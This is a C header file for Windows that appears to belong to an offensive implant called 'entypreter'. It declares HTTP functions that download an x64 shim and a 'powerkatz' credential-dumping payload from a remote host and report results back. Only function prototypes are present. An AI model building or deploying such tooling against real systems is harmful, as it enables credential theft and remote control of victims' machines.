#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Winsock2.h>
#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet.lib")

#include "entypreter_types.h"

BOOL entypreter_http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize);

BOOL entypreter_http_get_x64_shim(entypreter_shim_parsed *parsed, char **data, LPDWORD dwSize);
BOOL entypreter_http_get_powerkatz(entypreter_shim_parsed *parsed, char **data, LPDWORD dwSize);

BOOL entypreter_http_report_work(entypreter_shim_parsed *parsed, char *work);
BOOL entypreter_http_report_error(entypreter_shim_parsed *parsed, char *work);